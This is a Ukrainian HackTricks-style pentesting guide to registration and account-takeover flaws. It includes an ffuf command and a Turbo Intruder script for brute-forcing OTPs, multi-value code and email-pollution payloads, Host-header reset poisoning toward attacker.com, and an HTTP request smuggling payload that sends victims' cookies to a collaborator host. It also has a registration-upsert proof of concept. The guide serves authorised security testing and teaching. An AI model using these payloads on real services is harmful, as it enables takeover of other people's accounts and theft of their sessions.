# Уразливості реєстрації та захоплення облікових записів

{{#include ../banners/hacktricks-training.md}}

## Захоплення облікових записів через реєстрацію

### Повторна реєстрація

- Спробуйте зареєструватися з існуючим username
- Спробуйте варіації email:
- верхній регістр
- +1@
- додайте крапку в email
- спеціальні символи в імені email (%00, %09, %20)
- Додайте пробіли після email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Спробуйте трюки канонізації провайдера email (залежить від сервісу):
- Gmail ігнорує крапки та subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` доставляються в `victim@gmail.com`
- Деякі провайдери нечутливі до регістру в local-part
- Деякі провайдери підтримують unicode confusables. Спробуйте homoglyphs і soft hyphen `\u00AD` у local-part
- Зловживайте цим, щоб: обійти перевірки унікальності, отримати дублікати акаунтів/запрошення в workspace, або блокувати реєстрації жертви (тимчасовий DoS), поки готуєте takeover

### Username Enumeration

Перевірте, чи можна визначити, коли username вже зареєстровано в додатку.

- Різні повідомлення про помилку або HTTP статус-коди
- Різниця в часі відповіді (існуючий користувач може викликати запит до IdP/DB)
- Автозаповнення форми реєстрації профільними даними для відомих email
- Перевірте team/invite флоу: введення email може виявити наявність акаунту

### Password Policy

Під час створення користувача перевірте політику паролів (чи можна використовувати слабкі паролі).\
У такому випадку можна спробувати bruteforce облікових даних.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) щоб дізнатися, як спробувати захоплення облікових записів або витягти інформацію через **SQL Injections** у формах реєстрації.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Після реєстрації спробуйте змінити email і перевірте, чи ця зміна правильно валідується або чи можна встановити довільний email.

### More Checks

- Перевірте, чи можна використовувати **disposable emails** (mailinator, yopmail, 1secmail, etc.) або обійти блоклист через subaddressing як `victim+mailinator@gmail.com`
- **Long** **password** (>200) призводить до **DoS**
- **Перевірте ліміти запитів на створення акаунтів**
- Використайте username@**burp_collab**.net і проаналізуйте **callback**
- Якщо використовується верифікація номера телефону, перевірте кейси парсингу/інʼєкцій номерів телефону

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Слабка верифікація Email/Телефону (OTP/Magic Link)

Флоу реєстрації часто підтверджують право власності через числовий OTP або magic-link токен. Типові вади:

- Передбачуваний або короткий OTP (4–6 цифр) без ефективного rate limiting або відстеження IP/device. Спробуйте паралельні підбори та ротацію header/IP.
- Повторне використання OTP між діями або акаунтами, або токен не прив'язаний до конкретного користувача/дії (наприклад, той самий код працює для login і signup, або працює після зміни email).
- Multi-value smuggling: деякі бекенди приймають кілька кодів і валідують, якщо будь-який співпадає. Спробуйте:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: відрізняйте неправильні, прострочені чи не-те-користувача коди за статусом/повідомленням/довжиною тіла відповіді.
- Токени, що не інвалідовуються після успіху або після зміни пароля/email.
- Verification token не прив'язаний до user agent/IP, що дозволяє завершити верифікацію cross-origin зі сторінок, контрольованих атакуючим.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Паралельне/конкурентне вгадування для обходу послідовних блокувань (використовуйте Turbo Intruder в Burp):

<details>
<summary>Фрагмент Turbo Intruder для масових спроб 6‑digit OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Спробуйте racing verification: відправте той самий дійсний OTP одночасно в двох сесіях; іноді одна сесія стає верифікованим обліковим записом зловмисника, тоді як потік жертви також завершиться успішно.
- Також протестуйте Host header poisoning на verification links (так само як reset poisoning нижче), щоб leak або завершити верифікацію на хості, контрольованому зловмисником.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Потужний клас проблем виникає, коли зловмисник виконує дії з поштою жертви до того, як жертва створить свій обліковий запис, а потім відновлює доступ пізніше.

Ключові техніки для тестування (адаптуйте під поточні потоки):

- Classic–Federated Merge
- Зловмисник: реєструє classic аккаунт з email жертви і встановлює пароль
- Жертва: пізніше реєструється через SSO (той самий email)
- Небезпечні merge можуть залишити обидві сторони залогіненими або відродити доступ зловмисника
- Unexpired Session Identifier
- Зловмисник: створює акаунт і утримує довготривалу сесію (не виходить)
- Жертва: відновлює/встановлює пароль і починає використовувати акаунт
- Тестуйте, чи старі сесії залишаються дійсними після reset або увімкнення MFA
- Trojan Identifier
- Зловмисник: додає вторинний ідентифікатор до заздалегідь створеного акаунта (телефон, додаткова email-адреса, або підключає IdP зловмисника)
- Жертва: скидає пароль; зловмисник пізніше використовує trojan identifier для скидання/входу
- Unexpired Email Change
- Зловмисник: ініціює зміну email на email зловмисника і утримує підтвердження
- Жертва: відновлює акаунт і починає користуватися ним
- Зловмисник: пізніше завершує очікувану зміну email, щоб вкрасти акаунт
- Non‑Verifying IdP
- Зловмисник: використовує IdP, який не перевіряє власність email, щоб заявити `victim@…`
- Жертва: реєструється класичним шляхом
- Сервіс зливає акаунти по email без перевірки `email_verified` або локальної верифікації

Практичні поради

- Збирайте flows та endpoints з web/mobile bundles. Шукайте classic signup, SSO linking, email/phone change та password reset endpoints.
- Створіть реалістичну автоматизацію, щоб утримувати сесії активними, поки ви тестуєте інші потоки.
- Для SSO-тестів підніміть тестовий OIDC provider і видавайте токени з `email` claims для адреси жертви та `email_verified=false`, щоб перевірити, чи довіряє RP неверифікованим IdP.
- Після будь-якого password reset або зміни email перевірте, що:
- всі інші сесії і токени скасовані,
- очікувані можливості зміни email/phone скасовані,
- раніше прив'язані IdP/email/phone повторно верифіковані.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Атакувальник повинен увійти під своїм обліковим записом і перейти до функції **Change password**.
2. Запустіть Burp Suite і перехопіть запит
3. Відправте його на вкладку repeater і відредагуйте параметри : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Password reset token має генеруватися випадково і бути унікальним щоразу.\
Спробуйте визначити, чи token має термін дії або чи він завжди однаковий — в деяких випадках алгоритм генерації слабкий і його можна вгадати. Наступні змінні можуть використовуватися алгоритмом.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Ініціюйте password reset request через API/UI для конкретної електронної адреси, наприклад: test@mail.com
2. Перевірте відповідь сервера і шукайте `resetToken`
3. Потім використайте token в URL, наприклад `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Зареєструйтесь у системі з username, ідентичним username жертви, але з доданими пробілами перед і/або після username. e.g: `"admin "`
2. Запросіть password reset для вашого зловмисного username.
3. Використайте token, надісланий на вашу електронну адресу, і скиньте пароль жертви.
4. Увійдіть у обліковий запис жертви з новим паролем.

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Знайдіть XSS всередині додатку або в субдомені, якщо cookies are scoped to the parent domain : `*.domain.com`
2. Leak поточний **sessions cookie**
3. Аутентифікуйтесь як користувач, використовуючи cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Використовуйте **smuggler** щоб визначити тип HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Сформуйте запит, який перепише `POST / HTTP/1.1` наступними даними:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` з метою open redirect жертв на burpcollab і викрадення їхніх cookies\
3. Фінальний запит може виглядати наступним чином
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone повідомляє про експлуатацію цієї вразливості\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Захоплення облікового запису через CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Створіть payload для CSRF, наприклад: “HTML form with auto submit for a password change”
2. Надішліть payload

### Захоплення облікового запису через JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token може використовуватися для автентифікації користувача.

- Редагуйте JWT, підставивши інший User ID / Email
- Перевірте наявність слабкого підпису JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Деякі signup handlers виконують upsert, коли вказаний email уже існує. Якщо endpoint приймає мінімальне тіло з email та password і не вимагає перевірки права власності, відправлення email жертви перезапише її пароль до авторизації.

- Виявлення: збирайте імена endpoint з bundled JS (або трафіку мобільного додатка), потім fuzz базові шляхи, наприклад /parents/application/v4/admin/FUZZ, використовуючи ffuf/dirsearch.
- Підказки щодо методу: GET, що повертає повідомлення на кшталт "Only POST request is allowed." часто вказує на правильний HTTP-метод та на те, що очікується JSON body.
- Мінімальне тіло, спостережене у реальних випадках:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Приклад PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Вплив: Full Account Takeover (ATO) без жодного reset token, OTP або email verification.

## Джерела

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
